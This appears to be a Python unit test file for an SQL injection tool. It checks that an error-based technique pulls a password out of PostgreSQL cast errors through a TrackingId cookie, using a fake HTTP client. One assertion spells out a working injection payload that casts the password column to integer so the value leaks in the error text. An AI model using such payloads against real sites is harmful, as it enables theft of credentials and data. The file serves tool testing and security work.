"""Tests for visible error-based extraction."""

import unittest

from core import BlindAttackEngine, VisibleErrorTechnique
from detection import ErrorDetector, ErrorValueExtractor
from models import HttpResponseData, RequestData
from payloads import CookieInjectionPoint, PostgresCastPayloadBuilder


class FakeHttpClient:
    def __init__(self) -> None:
        self.requests = []

    def send(self, request: RequestData) -> HttpResponseData:
        self.requests.append(request)
        value = "probe" if len(self.requests) == 1 else "confirm"
        if len(self.requests) >= 3:
            value = "S3cr3t!"
        return HttpResponseData(
            500,
            f'invalid input syntax for type integer: "{value}"',
        )


class VisibleErrorTests(unittest.TestCase):
    def test_extracts_value_from_postgres_error(self) -> None:
        client = FakeHttpClient()
        technique = VisibleErrorTechnique(
            http_client=client,
            payload_builder=PostgresCastPayloadBuilder(),
            injection_point=CookieInjectionPoint("TrackingId", "replace"),
            error_detector=ErrorDetector(error_regex=r"invalid input syntax"),
            value_extractor=ErrorValueExtractor(
                r'invalid input syntax for type integer:\s*"(?P<value>.*?)"'
            ),
            base_request=RequestData(
                "https://example.test",
                cookies={"TrackingId": "original-value"},
            ),
        )

        result = BlindAttackEngine(technique).run(["password"])

        self.assertEqual(result.extractions["password"].value, "S3cr3t!")
        self.assertTrue(result.extractions["password"].complete)
        self.assertEqual(client.requests[2].cookies["TrackingId"], "'||(SELECT CAST((password) AS integer))||'--")

    def test_parser_returns_none_without_matching_error(self) -> None:
        extractor = ErrorValueExtractor(r'error: "(?P<value>.*?)"')
        response = HttpResponseData(200, "normal response")
        self.assertIsNone(extractor.extract(response))
        self.assertFalse(extractor.matches(response))

    def test_value_pattern_requires_named_value_group(self) -> None:
        with self.assertRaises(ValueError):
            ErrorValueExtractor(r"error: (.*)")


if __name__ == "__main__":
    unittest.main()
